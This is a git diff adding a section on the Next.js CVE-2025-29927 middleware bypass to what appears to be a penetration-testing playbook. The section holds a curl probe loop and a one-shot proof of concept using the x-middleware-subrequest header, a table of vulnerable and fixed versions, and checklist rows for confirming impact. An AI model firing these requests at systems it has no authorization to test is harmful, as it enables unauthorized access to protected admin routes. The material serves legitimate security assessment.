@@ -96,6 +96,54 @@ curl -s "https://$TARGET/_next/data/$BUILD_ID/..%2Fadmin%2Fusers.json"
 
 ---
 
+## Phase 3b — CVE-2025-29927 Middleware Bypass (`x-middleware-subrequest`)
+
+CVE-2025-29927 (March 2025, Critical): Next.js trusts the internal `x-middleware-subrequest` request header to mark a request as an already-handled subrequest and SKIP middleware execution entirely. Any auth/authorization check implemented in `middleware.ts` is bypassed by sending that header from outside. The PoC value chains the middleware path token to match nesting depth (`middleware:middleware:...`); for a `src/` layout the token is `src/middleware`.
+
+```bash
+# Probe: pick a route whose protection lives in middleware (auth gate / redirect)
+PROT="/dashboard"   # or /admin, /account — a middleware-guarded route
+
+# 1) Baseline — request normally with NO auth (expect 307/302 redirect or 401/403)
+curl -s -o /dev/null -w "baseline=%{http_code}\n" "https://$TARGET$PROT"
+
+# 2) Resend with the bypass header. Try increasing token depth and the src/ variant.
+for H in \
+  "middleware" \
+  "middleware:middleware" \
+  "middleware:middleware:middleware:middleware:middleware" \
+  "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" ; do
+  echo -n "subrequest='$H' -> "
+  curl -s -o /dev/null -w "%{http_code}\n" \
+    -H "x-middleware-subrequest: $H" "https://$TARGET$PROT"
+done
+
+# VULNERABLE if a header request returns 200 + the protected content while the
+# baseline was a 307/302/401/403. Diff the bodies to confirm real protected
+# content (not just a status flip) before reporting.
+```
+
+curl PoC (single shot, deep token):
+
+```bash
+curl -i "https://$TARGET/admin" \
+  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
+# 200 + admin page body (instead of the login redirect) = auth bypass confirmed
+```
+
+**Affected / fixed versions** (versions below the fix on each release line are vulnerable):
+
+| Release line | Vulnerable | Fixed in |
+|---|---|---|
+| 15.x | < 15.2.3 | 15.2.3 |
+| 14.x | < 14.2.25 | 14.2.25 |
+| 13.x | < 13.5.9 | 13.5.9 |
+| 12.x | < 12.3.5 | 12.3.5 |
+
+> Only applies when auth/authorization is enforced in Next.js Middleware. Apps with no middleware, or that gate access in route handlers/Server Components, are not exploitable via this header. Confirm the version (Phase 1) and that the protected route is middleware-gated before claiming impact.
+
+---
+
 ## Phase 4 — Image Optimization SSRF (`/_next/image`)
 
 ```bash
@@ -226,6 +274,7 @@ if m:
 | `/_next/image` SSRF | Cloud metadata → IAM creds | Cloud compromise |
 | `/_next/data/` IDOR | Other users' server-side props | PII / token exfil |
 | Middleware bypass | Protected admin routes | Auth bypass |
+| CVE-2025-29927 `x-middleware-subrequest` | Skip middleware → reach any middleware-gated route | Auth/authz bypass (Critical) |
 | Source map exposed | Reconstruct TS source → find hardcoded secrets | Further vulns |
 | `__NEXT_DATA__` leaks | Server-side secrets in HTML | API keys / tokens |
 
@@ -236,6 +285,7 @@ if m:
 ✅ Server Action: action executes without valid session, returns data or mutates state
 ✅ SSRF: DNS/HTTP callback received from `/_next/image` SSRF
 ✅ Middleware bypass: 200 response on protected route without auth cookie
+✅ CVE-2025-29927: `x-middleware-subrequest` header flips baseline 307/401 → 200 with real protected body, and version is below the fixed release
 ✅ Data leak: `__NEXT_DATA__` contains non-public secrets or other users' PII
 
 **Severity:**
